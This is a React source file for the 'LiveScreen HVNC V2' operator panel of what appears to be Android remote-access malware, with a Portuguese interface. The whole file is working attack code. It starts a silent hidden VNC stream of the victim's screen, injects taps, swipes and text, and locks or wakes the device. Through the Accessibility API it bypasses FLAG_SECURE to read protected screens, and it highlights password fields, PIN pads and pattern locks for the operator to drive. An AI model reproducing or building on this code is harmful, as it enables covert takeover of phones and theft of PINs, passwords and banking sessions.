/**
 * LiveScreen — HVNC V2 (Final)
 *
 * Frame pipeline (APK → dashboard):
 *   takeScreenshot() → Bitmap 350×650 → JPEG compress → ByteBuffer [0x01][4-byte size][jpeg]
 *   → WebSocket binary → relayVncFrame() → vnc_meta JSON + binary frame
 *   → ws.onBinary() → createImageBitmap() → dirty-flag RAF draw
 *
 * Coordinate pipeline (dashboard → APK):
 *   Canvas CSS px → normalize 0–1 → { x, y, scale:'vnc_norm' }
 *   APK: x_device = normX * realScreenWidth   (handles every resolution)
 *        y_device = normY * realScreenHeight
 *
 *   Node taps from hierarchy: already in real device px → send raw (no scale param).
 *
 * Smoothness:
 *   - createImageBitmap: GPU-side async JPEG decode, no DOM Image overhead
 *   - dirty flag: RAF only calls drawImage when a new frame arrived — zero idle cost
 *   - { alpha: false }: skips alpha compositing for pure JPEG frames
 *   - { desynchronized: true }: canvas can update outside main frame sync on Chromium
 *   - Previous bitmap .close() on decode: releases GPU texture immediately
 */
import { useEffect, useRef, useState, useCallback } from 'react';
import useStore from '../../store/index.js';
import { ws }   from '../../ws.js';

// ─── APK frame constants ───────────────────────────────────────────────────────
const APK_W = 350;
const APK_H = 650;

// ─── Hierarchy parser (real APK format from UiAssistBridge.java) ──────────────
// APK sends bounds as { x, y, w, h }; convert to { left, top, right, bottom }
function apkRect(b) {
  if (!b) return null;
  const left = b.left ?? b.x ?? 0;
  const top  = b.top  ?? b.y ?? 0;
  const right  = b.right  ?? (left + (b.w ?? 0));
  const bottom = b.bottom ?? (top  + (b.h ?? 0));
  return { left, top, right, bottom };
}

function walkNode(raw, depth, out) {
  if (!raw || depth > 30) return;
  const text   = raw.text || raw.desc || raw.contentDescription || '';
  const bounds = apkRect(raw.bounds);
  const wide   = bounds && bounds.right - bounds.left > 0;
  if (text || wide) {
    out.push({
      text:          text.trim(),
      cls:           raw.class || raw.className || '',
      pkg:           raw.pkg || raw.packageName || raw.windowPackage || '',
      clickable:     !!raw.clickable,
      enabled:       raw.enabled !== false,
      checked:       !!raw.checked,
      focused:       !!raw.focused,
      scrollable:    !!raw.scrollable,
      editable:      !!raw.editable,
      password:      !!raw.password,
      bounds,
      depth,
      id:            raw.id || raw.viewIdResourceName || '',
      isKeyboard:    !!(raw.isKeyboard || raw.isKeyboardKey),
      isPinDigit:    !!raw.isPinDigit,
      isPatternLock: !!raw.isPatternLock,
      isSwipeUnlock: !!raw.isSwipeUnlock,
      patternGrid:   raw.patternGrid || null,
      swipeHint:     raw.swipeHint   || null,
    });
  }
  const ch = raw.children || raw.childList || [];
  for (const c of ch) walkNode(c, depth + 1, out);
}

function parseHierarchy(raw) {
  const out = [];
  try {
    const p    = typeof raw === 'string' ? JSON.parse(raw) : raw;
    const root = p?.hierarchy ?? p;
    const list = Array.isArray(root) ? root : [root];
    for (const r of list) walkNode(r, 0, out);
  } catch (_) {}
  return out;
}

function extractLines(nodes) {
  const tx = nodes.filter(n => n.text).sort((a, b) => {
    const ay = a.bounds ? (a.bounds.top + a.bounds.bottom) / 2 : 0;
    const by = b.bounds ? (b.bounds.top + b.bounds.bottom) / 2 : 0;
    return ay - by;
  });
  const rows = [];
  let row = [], lastY = -Infinity;
  for (const n of tx) {
    const y = n.bounds ? (n.bounds.top + n.bounds.bottom) / 2 : lastY + 40;
    if (Math.abs(y - lastY) > 22 && row.length) {
      rows.push([...row].sort((a, b) => (a.bounds?.left ?? 0) - (b.bounds?.left ?? 0)));
      row = [];
    }
    row.push(n); lastY = y;
  }
  if (row.length) rows.push(row);
  return rows;
}

const bCenter = b => b ? {
  x: Math.round((b.left + b.right)  / 2),
  y: Math.round((b.top  + b.bottom) / 2),
} : null;

// ─── Main component ────────────────────────────────────────────────────────────
const MODES = ['HVNC', 'V2', 'DUPLO'];

export default function LiveScreen({ deviceId, onBack, sendCmd }) {
  const canvasRef   = useRef(null);
  const ctxRef      = useRef(null);     // cached 2D context
  const bitmapRef   = useRef(null);     // latest decoded ImageBitmap
  const dirtyRef    = useRef(false);    // true when new bitmap is waiting to be drawn
  const rafRef      = useRef(null);
  const fpsDecRef   = useRef(0);
  const latRef      = useRef(performance.now());
  const tStartRef   = useRef(null);     // touch start: { clientX, clientY, ts }
  const mStartRef   = useRef(null);     // mouse start
  const autoRef     = useRef(null);
  const ocrRef      = useRef(null);

  const setVnc = useStore(s => s.setVncActive);

  const [mode, setMode]         = useState('HVNC');
  const [quality, setQuality]   = useState(60);
  const [fps, setFps]           = useState(0);
  const [latMs, setLatMs]       = useState(0);
  const [vncOn, setVncOn]       = useState(false);

  // V2 reader state
  const [nodes, setNodes]         = useState([]);
  const [lines, setLines]         = useState([]);
  const [rawData, setRawData]     = useState('');
  const [srTab, setSrTab]         = useState('ocr');
  const [filter, setFilter]       = useState('');
  const [toast, setToast]         = useState(null);
  const [srTs, setSrTs]           = useState(null);
  const [srPkg, setSrPkg]         = useState('');
  const [liveMode, setLiveMode]   = useState(false);
  const [typeText, setTypeText]   = useState('');
  const [tapX, setTapX]           = useState('');
  const [tapY, setTapY]           = useState('');

  // ── Get or create 2D context with optimal flags ────────────────────────────
  function getCtx() {
    if (ctxRef.current) return ctxRef.current;
    const c = canvasRef.current;
    if (!c) return null;
    ctxRef.current = c.getContext('2d', {
      alpha:          false,   // JPEG has no alpha — skip compositing
      desynchronized: true,    // detach from main-thread vsync on Chromium
    });
    if (ctxRef.current) ctxRef.current.imageSmoothingEnabled = false;
    return ctxRef.current;
  }

  // ── RAF render loop ─────────────────────────────────────────────────────────
  // Only draws when dirtyRef is set — zero idle overhead between frames
  useEffect(() => {
    function loop() {
      if (dirtyRef.current) {
        const bmp = bitmapRef.current;
        const ctx = getCtx();
        if (bmp && ctx) {
          ctx.drawImage(bmp, 0, 0);
        }
        dirtyRef.current = false;
      }
      rafRef.current = requestAnimationFrame(loop);
    }
    rafRef.current = requestAnimationFrame(loop);
    return () => {
      cancelAnimationFrame(rafRef.current);
      bitmapRef.current?.close?.();
    };
  }, []);

  // ── Binary VNC frame pipeline ────────────────────────────────────────────────
  // Protocol: [0x01][uint32be(size)][jpeg_bytes]
  // Server strips header, relays raw jpeg buffer.
  // ws._vncDeviceId is set from preceding vnc_meta message.
  useEffect(() => {
    const unsub = ws.onBinary((buf, devId) => {
      if (devId !== deviceId) return;
      const now = performance.now();
      setLatMs(prev => {
        const ms = Math.round(now - latRef.current);
        latRef.current = now;
        return ms;
      });
      fpsDecRef.current++;
      // createImageBitmap: async GPU-side decode, never blocks main thread
      createImageBitmap(new Blob([buf], { type: 'image/jpeg' })).then(bmp => {
        bitmapRef.current?.close?.();   // release previous GPU texture
        bitmapRef.current = bmp;
        dirtyRef.current  = true;       // signal RAF to draw
      }).catch(() => {});
    });

    const fpsTick = setInterval(() => {
      setFps(fpsDecRef.current);
      fpsDecRef.current = 0;
    }, 1000);

    return () => { unsub(); clearInterval(fpsTick); };
  }, [deviceId]);

  // ── Hierarchy + VNC status messages ──────────────────────────────────────────
  useEffect(() => {
    const unsub = ws.onMessage(msg => {
      if (msg.device_id !== deviceId) return;
      if (msg.type === 'screen_hierarchy') {
        const raw = msg.data || '{}';
        try {
          const parsed = typeof raw === 'string' ? JSON.parse(raw) : raw;
          setSrPkg(parsed.package || '');
          const n = parseHierarchy(raw);
          const l = extractLines(n);
          setNodes(n); setLines(l);
          setRawData(typeof raw === 'string' ? raw : JSON.stringify(raw, null, 2));
          setSrTs(msg.ts);
          showToast('REQUEST_HIERARCHY com sucesso!');
          setTimeout(() => ocrRef.current?.scrollTo({ top: 0, behavior: 'smooth' }), 40);
        } catch (_) {}
      }
      if (msg.type === 'vnc_status') {
        setVncOn(!!msg.active); setVnc(!!msg.active);
      }
    });
    return unsub;
  }, [deviceId]);

  // ── Auto-live SR polling ──────────────────────────────────────────────────────
  useEffect(() => {
    clearInterval(autoRef.current);
    if (liveMode) {
      sendCmd('REQUEST_HIERARCHY');
      autoRef.current = setInterval(() => sendCmd('REQUEST_HIERARCHY'), 500);
    }
    return () => clearInterval(autoRef.current);
  }, [liveMode, sendCmd]);

  // ── Controls ──────────────────────────────────────────────────────────────────
  function startVnc() {
    sendCmd('START_SILENT_VNC');
    ws.subscribe('vnc', deviceId);
    setVncOn(true); setVnc(true);
  }
  function stopVnc() {
    sendCmd('STOP_SILENT_VNC');
    ws.unsubscribe('vnc', deviceId);
    setVncOn(false); setVnc(false);
  }
  function handleBack() { stopVnc(); setLiveMode(false); onBack(); }
  function showToast(m) { setToast(m); setTimeout(() => setToast(null), 2200); }

  // ── Coordinate helpers ────────────────────────────────────────────────────────
  // All canvas-interaction taps/swipes go through this → normalized 0–1.
  // APK maps: x_device = normX * realScreenWidth (vnc_norm mode).
  // Works on any device resolution — pixel-perfect placement guaranteed.
  function normCoords(clientX, clientY) {
    const c = canvasRef.current;
    if (!c) return { x: 0.5, y: 0.5 };
    const r = c.getBoundingClientRect();
    return {
      x: Math.max(0.001, Math.min(0.999, (clientX - r.left) / r.width)),
      y: Math.max(0.001, Math.min(0.999, (clientY - r.top)  / r.height)),
    };
  }

  // ── Touch events ──────────────────────────────────────────────────────────────
  const onTouchStart = useCallback(e => {
    e.preventDefault(); // block scroll / zoom
    const t = e.touches[0];
    tStartRef.current = { clientX: t.clientX, clientY: t.clientY, ts: Date.now() };
  }, []);

  const onTouchEnd = useCallback(e => {
    e.preventDefault();
    if (!tStartRef.current) return;
    const t = e.changedTouches[0];
    const { clientX: sx, clientY: sy, ts } = tStartRef.current;
    const dt   = Date.now() - ts;
    // Distance in CSS pixels — reliable threshold regardless of canvas scale
    const dist = Math.hypot(t.clientX - sx, t.clientY - sy);
    tStartRef.current = null;

    if (dist < 14) {
      // Tap / long-press: use START position (more precise than end)
      const { x, y } = normCoords(sx, sy);
      sendCmd(dt > 600 ? 'LONG_PRESS' : 'TAP', { x, y, scale: 'vnc_norm' });
    } else {
      // Swipe: normalize both endpoints
      const s   = normCoords(sx, sy);
      const end = normCoords(t.clientX, t.clientY);
      sendCmd('SWIPE', { x1: s.x, y1: s.y, x2: end.x, y2: end.y, scale: 'vnc_norm', duration: dt });
    }
  }, [sendCmd]);

  // ── Mouse events ──────────────────────────────────────────────────────────────
  const onMouseDown = useCallback(e => {
    mStartRef.current = { clientX: e.clientX, clientY: e.clientY, ts: Date.now() };
  }, []);

  const onMouseUp = useCallback(e => {
    if (!mStartRef.current) return;
    const { clientX: sx, clientY: sy, ts } = mStartRef.current;
    const dt   = Date.now() - ts;
    const dist = Math.hypot(e.clientX - sx, e.clientY - sy);
    mStartRef.current = null;

    if (dist < 6) {
      const { x, y } = normCoords(sx, sy);
      sendCmd('TAP', { x, y, scale: 'vnc_norm' });
    } else {
      const s   = normCoords(sx, sy);
      const end = normCoords(e.clientX, e.clientY);
      sendCmd('SWIPE', { x1: s.x, y1: s.y, x2: end.x, y2: end.y, scale: 'vnc_norm', duration: dt });
    }
  }, [sendCmd]);

  // ── Tap a node from hierarchy (bounds are real screen pixels — send raw) ──────
  function tapNode(n) {
    const c = bCenter(n.bounds);
    if (c) { sendCmd('TAP', { x: c.x, y: c.y }); showToast(`TAP → ${n.text || n.cls}`); }
  }

  // ── Filtered node list ────────────────────────────────────────────────────────
  const filteredNodes = filter
    ? nodes.filter(n =>
        n.text?.toLowerCase().includes(filter.toLowerCase()) ||
        n.cls?.toLowerCase().includes(filter.toLowerCase()) ||
        n.id?.toLowerCase().includes(filter.toLowerCase()))
    : nodes;

  const showCanvas = mode === 'HVNC' || mode === 'DUPLO';
  const showReader = mode === 'V2'   || mode === 'DUPLO';

  // ─────────────────────────────────────────────────────────────────────────────
  return (
    <div className="fade-up">

      {/* Toast */}
      {toast && (
        <div style={{
          position: 'fixed', top: 70, left: '50%', transform: 'translateX(-50%)',
          background: 'rgba(10,8,2,.97)', border: '1px solid var(--gold)',
          borderRadius: 12, padding: '10px 18px', zIndex: 9999,
          maxWidth: '86vw', textAlign: 'center', pointerEvents: 'none',
          boxShadow: '0 4px 32px rgba(0,0,0,.65)',
        }}>
          <div style={{ color: '#00c864', fontSize: 15, marginBottom: 2 }}>✓</div>
          <div style={{ color: 'var(--gold)', fontWeight: 700, fontSize: 11 }}>Comando</div>
          <div style={{ color: '#00c864', fontWeight: 800, fontSize: 13 }}>REQUEST_HIERARCHY</div>
          <div style={{ color: 'var(--gold)', fontWeight: 700, fontSize: 11 }}>com sucesso!</div>
        </div>
      )}

      {/* ── Toolbar ─────────────────────────────────────────────────────────── */}
      <div className="row-sb mb8">
        <div>
          <div style={{ fontWeight: 800, fontSize: 13, color: 'var(--gold)', letterSpacing: 1 }}>
            EDITAR V2 ✏
          </div>
          <div className="row gap6 mt4">
            <span style={{ fontSize: 11, color: 'var(--text2)' }}>LEITOR OCR</span>
            <span style={{ fontSize: 11, color: '#00c864', fontWeight: 700 }}>⚡</span>
            <span style={{ fontSize: 11, fontWeight: 700,
              color: nodes.filter(n => n.text).length > 0 ? '#00c864' : 'var(--text3)' }}>
              {nodes.filter(n => n.text).length > 0
                ? `${Math.min(99, nodes.filter(n => n.text).length)}%` : '—'}
            </span>
          </div>
        </div>
        <div className="row gap5" style={{ flexWrap: 'wrap', justifyContent: 'flex-end' }}>
          {MODES.map(m => (
            <button key={m}
              onClick={() => {
                setMode(m);
                if (m !== 'HVNC') sendCmd('REQUEST_HIERARCHY');
              }}
              className={`btn btn-sm ${mode === m ? 'btn-blue' : 'btn-ghost'}`}
              style={{ padding: '4px 10px', fontSize: 11, fontWeight: 700 }}>
              {m}
            </button>
          ))}
          <button className="btn btn-ghost btn-sm" onClick={handleBack}>←</button>
        </div>
      </div>

      {/* ── Status bar ──────────────────────────────────────────────────────── */}
      <div className="row gap6 mb8">
        <span className={`pill ${vncOn ? 'pill-green' : 'pill-dim'}`} style={{ fontSize: 10 }}>
          {vncOn ? `▶ ${fps} FPS · ${latMs}ms` : '⏹ HVNC OFF'}
        </span>
        {srPkg && (
          <span className="pill pill-dim" style={{ fontSize: 10 }}>
            {srPkg.split('.').slice(-1)[0]}
          </span>
        )}
        {nodes.length > 0 && (
          <span className="pill pill-gold" style={{ fontSize: 10 }}>
            {nodes.filter(n => n.text).length} nodes
          </span>
        )}
        {liveMode && (
          <span className="pill pill-red" style={{ fontSize: 10 }}>🔴 LIVE</span>
        )}
      </div>

      {/* ── VNC Canvas ──────────────────────────────────────────────────────── */}
      {showCanvas && (
        <div
          className="vnc-wrap mb8"
          style={{
            position: 'relative',
            // Prevent browser scroll/zoom from hijacking touch events on canvas
            touchAction: 'none',
            cursor: vncOn ? 'crosshair' : 'default',
          }}
          onTouchStart={onTouchStart}
          onTouchEnd={onTouchEnd}
          onMouseDown={onMouseDown}
          onMouseUp={onMouseUp}
        >
          {/* Canvas is exactly APK_W × APK_H pixels; CSS scales it to fill width */}
          <canvas
            ref={canvasRef}
            width={APK_W}
            height={APK_H}
            className="vnc-canvas"
          />
          {!vncOn && (
            <div className="vnc-overlay">
              <div className="spin" />
              <div style={{ fontSize: 12, color: 'var(--text2)', marginTop: 8 }}>
                Aguardando stream...
              </div>
            </div>
          )}
          {vncOn && (
            <div className="vnc-hud">
              <span className="vnc-fps" style={{ background: 'rgba(20,80,200,.85)' }}>HVNC</span>
              <span className="vnc-fps">{fps} FPS · {latMs}ms</span>
            </div>
          )}
        </div>
      )}

      {/* ── VNC Controls ────────────────────────────────────────────────────── */}
      <div className="grid g2 mb8">
        <button className="btn btn-gold btn-block btn-sm" onClick={startVnc}>▶ INICIAR</button>
        <button className="btn btn-red  btn-block btn-sm" onClick={stopVnc}>⏹ PARAR</button>
        <button className="btn btn-ghost btn-block btn-sm"
          onClick={() => sendCmd('FORCE_RESTART_VNC')}>↺ RESTART</button>
        <button className="btn btn-ghost btn-block btn-sm"
          onClick={() => sendCmd('SNAP_SCREEN')}>📷 SNAP</button>
      </div>

      {/* Quality slider */}
      {showCanvas && (
        <div className="card card-sm mb8">
          <div className="row-sb mb4">
            <span className="txt-xs txt-dim">QUALIDADE JPEG</span>
            <span className="txt-xs txt-gold bold">{quality}%</span>
          </div>
          <input type="range" min="10" max="100" value={quality}
            style={{ width: '100%', accentColor: '#d4950a' }}
            onChange={e => {
              setQuality(+e.target.value);
              sendCmd('SET_SILENT_VNC_QUALITY', { quality: +e.target.value });
            }} />
        </div>
      )}

      {/* ── Navigation keys ─────────────────────────────────────────────────── */}
      <div className="section-title mt2">Navegação</div>
      <div className="grid g4 mb10">
        {[
          ['◀','BACK'],['⌂','HOME'],['⧉','RECENTS'],['⏻','POWER_MENU'],
          ['🔔','NOTIFICATIONS'],['⚙','QUICK_SETTINGS'],['💡','WAKEUP'],['🔒','LOCK_DEVICE'],
        ].map(([icon, action]) => (
          <button key={action} className="btn btn-ghost btn-sm btn-block"
            onClick={() => sendCmd(action)}>{icon}</button>
        ))}
      </div>

      {/* ── Manual tap / type / swipe ───────────────────────────────────────── */}
      <div className="section-title">Toque Manual</div>
      <div className="card card-sm mb10">
        <div className="txt-xs txt-dim mb6">
          Coordenadas brutas (pixels reais do dispositivo)
        </div>
        <div className="input-row mb8">
          <input className="input" placeholder="X" type="number" value={tapX}
            onChange={e => setTapX(e.target.value)} style={{ width: 72 }} />
          <input className="input" placeholder="Y" type="number" value={tapY}
            onChange={e => setTapY(e.target.value)} style={{ width: 72 }} />
          <button className="btn btn-gold btn-sm"
            onClick={() => sendCmd('TAP', { x: +tapX, y: +tapY })}>TAP</button>
          <button className="btn btn-ghost btn-sm"
            onClick={() => sendCmd('LONG_PRESS', { x: +tapX, y: +tapY, duration: 800 })}>HOLD</button>
        </div>
        <div className="txt-xs txt-dim mb6">Injetar Texto</div>
        <div className="input-row">
          <input className="input" placeholder="Texto para injetar..."
            value={typeText} onChange={e => setTypeText(e.target.value)}
            onKeyDown={e => {
              if (e.key === 'Enter') { sendCmd('TYPE', { text: typeText }); setTypeText(''); }
            }} />
          <button className="btn btn-gold btn-sm"
            onClick={() => { sendCmd('TYPE', { text: typeText }); setTypeText(''); }}>
            TYPE
          </button>
        </div>
      </div>

      {/* ── FLAG_SECURE Bypass — Screen Reader V2 ───────────────────────────── */}
      {showReader && (
        <div>
          <div className="section-title mt4">
            <span style={{ color: '#00c864' }}>🔓</span> Screen Reader V2 — FLAG_SECURE Bypass
          </div>

          <div className="row gap6 mb8" style={{ flexWrap: 'wrap' }}>
            <button className="btn btn-gold btn-sm"
              onClick={() => { sendCmd('REQUEST_HIERARCHY'); showToast('Aguardando...'); }}>
              🌳 HIERARCHY
            </button>
            <button className={`btn btn-sm ${liveMode ? 'btn-red' : 'btn-ghost'}`}
              onClick={() => setLiveMode(v => !v)}>
              {liveMode ? '⏹ LIVE OFF' : '🔴 LIVE ON'}
            </button>
            <button className="btn btn-ghost btn-sm"
              onClick={() => sendCmd('TOGGLE_SCREEN_READER', { enabled: true })}>👁 SR ON</button>
            <button className="btn btn-ghost btn-sm"
              onClick={() => sendCmd('TOGGLE_SCREEN_READER', { enabled: false })}>⏹ SR OFF</button>
            <button className="btn btn-ghost btn-sm"
              onClick={() => { setNodes([]); setLines([]); setRawData(''); }}>🗑</button>
          </div>

          {/* Tab selector */}
          <div className="row gap6 mb8">
            {[['ocr','📄 OCR'],['nodes','🔵 NODES'],['raw','{ } RAW']].map(([id, lbl]) => (
              <button key={id} onClick={() => setSrTab(id)}
                className={`btn btn-sm ${srTab === id ? 'btn-gold' : 'btn-ghost'}`}>{lbl}</button>
            ))}
            {srTs && (
              <span className="txt-xs txt-dim" style={{ alignSelf: 'center', marginLeft: 'auto' }}>
                {new Date(srTs).toLocaleTimeString()}
              </span>
            )}
          </div>

          {/* Stats */}
          {nodes.length > 0 && (
            <div className="row gap6 mb8">
              <span className="pill pill-green"  style={{ fontSize: 10 }}>{nodes.filter(n=>n.text).length} textos</span>
              <span className="pill pill-gold"   style={{ fontSize: 10 }}>{nodes.filter(n=>n.clickable).length} clicáveis</span>
              <span className="pill pill-purple" style={{ fontSize: 10 }}>{nodes.filter(n=>n.isKeyboard).length} teclado</span>
              <span className="pill pill-dim"    style={{ fontSize: 10 }}>{lines.length} linhas</span>
            </div>
          )}

          {/* OCR tab */}
          {srTab === 'ocr' && (
            <div ref={ocrRef} style={{ maxHeight: 460, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: 2 }}>
              {lines.length === 0 && (
                <div className="no-data" style={{ padding: 44 }}>
                  <div style={{ fontSize: 38, marginBottom: 10 }}>🌳</div>
                  <div style={{ fontSize: 13 }}>Toque HIERARCHY para ler a tela</div>
                  <div style={{ fontSize: 11, color: 'var(--text3)', marginTop: 4 }}>
                    Bypass FLAG_SECURE via Accessibility API
                  </div>
                </div>
              )}
              {lines.map((row, ri) => (
                <div key={ri} style={{
                  display: 'flex', gap: 4, flexWrap: 'wrap',
                  padding: '3px 8px', borderRadius: 6,
                  background: ri % 2 === 0 ? 'rgba(212,149,10,.04)' : 'transparent',
                }}>
                  {row.map((nd, ni) => (
                    <button key={ni} onClick={() => tapNode(nd)}
                      style={{
                        background: nd.isPinDigit
                          ? 'rgba(59,122,240,.18)'
                          : nd.isKeyboard
                          ? 'rgba(152,85,232,.12)'
                          : nd.clickable
                          ? 'rgba(212,149,10,.12)' : 'rgba(255,255,255,.04)',
                        border: `1px solid ${
                          nd.isPinDigit  ? 'rgba(59,122,240,.5)'  :
                          nd.isKeyboard  ? 'rgba(152,85,232,.4)'  :
                          nd.clickable   ? 'rgba(212,149,10,.4)'  : 'rgba(255,255,255,.08)'}`,
                        borderRadius: 6, padding: '4px 10px',
                        color: nd.isPinDigit ? 'var(--blue)' :
                               nd.isKeyboard ? 'var(--purple)' :
                               nd.clickable  ? 'var(--gold)' : 'var(--text2)',
                        fontSize: 12, fontWeight: nd.clickable ? 700 : 400,
                        cursor: nd.clickable ? 'pointer' : 'default',
                        fontFamily: 'var(--font)', transition: 'background .1s',
                        opacity: nd.enabled ? 1 : 0.5,
                      }}
                      title={`${nd.cls}\n[${nd.bounds?.left},${nd.bounds?.top}→${nd.bounds?.right},${nd.bounds?.bottom}]`}
                    >
                      {nd.text}
                      {nd.password && <span style={{ marginLeft: 4, fontSize: 10 }}>🔒</span>}
                      {nd.checked  && <span style={{ marginLeft: 4, color: '#00c864' }}>✓</span>}
                    </button>
                  ))}
                </div>
              ))}
            </div>
          )}

          {/* Nodes tab */}
          {srTab === 'nodes' && (
            <div>
              <div className="input-row mb8">
                <input className="input" placeholder="Filtrar..." value={filter}
                  onChange={e => setFilter(e.target.value)} />
                <span className="txt-xs txt-dim" style={{ alignSelf: 'center', whiteSpace: 'nowrap' }}>
                  {filteredNodes.length}/{nodes.length}
                </span>
              </div>
              <div style={{ maxHeight: 480, overflowY: 'auto' }}>
                {filteredNodes.slice(0, 250).map((nd, i) => (
                  <div key={i} className="card card-sm mb4"
                    style={{
                      borderLeft: `3px solid ${
                        nd.isPinDigit ? 'var(--blue)' :
                        nd.isKeyboard ? 'var(--purple)' :
                        nd.clickable  ? 'var(--gold)'  :
                        nd.focused    ? '#3b7af0' : 'var(--border)'}`,
                      paddingLeft: 10 + nd.depth * 6,
                      cursor: nd.clickable ? 'pointer' : 'default',
                      opacity: nd.enabled ? 1 : 0.5,
                    }}
                    onClick={() => nd.clickable && tapNode(nd)}
                  >
                    <div className="row-sb">
                      <div style={{ flex: 1, minWidth: 0 }}>
                        {nd.text && (
                          <div style={{ fontWeight: 600, fontSize: 13, color: 'var(--text)', marginBottom: 2 }}>
                            {nd.text}
                          </div>
                        )}
                        <div className="txt-xs txt-mono txt-dim"
                          style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                          {nd.cls.split('.').pop()}
                          {nd.id && <span style={{ marginLeft: 6, color: 'var(--text3)' }}>
                            #{nd.id.split('/').pop()}
                          </span>}
                        </div>
                      </div>
                      <div style={{ display: 'flex', flexDirection: 'column', gap: 2, alignItems: 'flex-end', flexShrink: 0 }}>
                        {nd.clickable    && <span className="pill pill-gold"   style={{ fontSize: 9, padding: '1px 5px' }}>TAP</span>}
                        {nd.scrollable   && <span className="pill pill-blue"   style={{ fontSize: 9, padding: '1px 5px' }}>SCROLL</span>}
                        {nd.isPinDigit   && <span className="pill pill-blue"   style={{ fontSize: 9, padding: '1px 5px' }}>PIN</span>}
                        {nd.isKeyboard   && <span className="pill pill-purple" style={{ fontSize: 9, padding: '1px 5px' }}>⌨</span>}
                        {nd.isPatternLock && <span className="pill pill-blue"  style={{ fontSize: 9, padding: '1px 5px' }}>⊞</span>}
                        {nd.password     && <span className="pill pill-red"    style={{ fontSize: 9, padding: '1px 5px' }}>🔒</span>}
                        {nd.checked      && <span className="pill pill-green"  style={{ fontSize: 9, padding: '1px 5px' }}>✓</span>}
                        {nd.editable     && <span className="pill pill-dim"    style={{ fontSize: 9, padding: '1px 5px' }}>EDIT</span>}
                      </div>
                    </div>
                    {nd.bounds && (
                      <div className="txt-xs txt-mono txt-dim mt4" style={{ fontSize: 10 }}>
                        [{nd.bounds.left},{nd.bounds.top}→{nd.bounds.right},{nd.bounds.bottom}]
                        {' '}({nd.bounds.right - nd.bounds.left}×{nd.bounds.bottom - nd.bounds.top})
                      </div>
                    )}
                    {nd.isPatternLock && nd.patternGrid && (
                      <div style={{ display: 'flex', gap: 4, marginTop: 6, flexWrap: 'wrap' }}>
                        {nd.patternGrid.map((p, pi) => (
                          <button key={pi} className="btn btn-ghost btn-xs"
                            style={{ minWidth: 28, fontSize: 11, fontWeight: 700 }}
                            onClick={ev => { ev.stopPropagation(); sendCmd('TAP', { x: p.x, y: p.y }); }}>
                            {pi + 1}
                          </button>
                        ))}
                      </div>
                    )}
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Raw tab */}
          {srTab === 'raw' && (
            <div>
              <div className="row-sb mb6">
                <span className="txt-xs txt-dim">{rawData.length} chars · {nodes.length} nós</span>
                <button className="btn btn-ghost btn-xs"
                  onClick={() => navigator.clipboard?.writeText(rawData).catch(() => {})}>
                  📋 COPIAR
                </button>
              </div>
              <div className="term"
                style={{ height: 460, overflowY: 'auto', whiteSpace: 'pre', fontSize: 10, lineHeight: 1.5 }}>
                {rawData || 'Nenhum dado. Toque HIERARCHY.'}
              </div>
            </div>
          )}
        </div>
      )}

      <div style={{ height: 24 }} />
    </div>
  );
}
